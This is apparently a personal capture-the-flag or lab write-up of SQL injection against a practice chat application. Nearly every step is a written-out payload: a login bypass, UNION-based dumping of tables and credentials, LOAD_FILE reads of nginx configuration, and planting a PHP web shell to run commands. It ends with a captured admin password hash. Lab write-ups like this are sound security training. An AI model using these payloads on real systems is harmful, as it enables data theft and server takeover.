# SQL LAB WRITEUP
- first I saw the login panel but none of the fields were responsive so I skipped to register.php
- After creating an account and logging into the application, I saw a search field that seemed suspicious to me, after checking it, I discovered another vulnerability
- Through further experimentation, I deduced that the backend SQL query likely involved extra parentheses, This meant my injection needed to first close that initial parenthesis. The correct payload structure emerged: ') OR 1=1 -- -
- I needed to find out how many columns the database has: ') UNION SELECT 1,2,3,4 -- -
- Listing Tables in chattr: ') UNION SELECT 1,2,table_name,4 FROM information_schema.tables WHERE table_schema='chattr' -- -
- Listing Columns in Users: ') UNION SELECT 1,2,column_name,table_name FROM information_schema.columns WHERE table_name='Users' -- -
-  Extracting Admin Credentials: ') UNION SELECT 1,2,Username,Password FROM chattr.Users -- -
-  Reading Nginx Config: ') UNION SELECT 1,2,LOAD_FILE('/etc/nginx/nginx.conf'),4 -- -
-  to read the default site configuration: ') UNION SELECT 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4 -- -
-  Webshell Injection: ') UNION SELECT "", "", "<?php system($_REQUEST[0]); ?>", "" INTO OUTFILE '/var/www/chattr-prod/shell.php' -- -
-  Then navigate to: https://<IP>:<PORT>/shell.php?0=id
-  after searching the files I found this file: flag_876a4c.txt
-  https://<IP>:<PORT>/shell.php?0=cat ../../../flag_876a4c.txt
-  root /var/www/chattr-prod; root path
-  admin password hash $argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
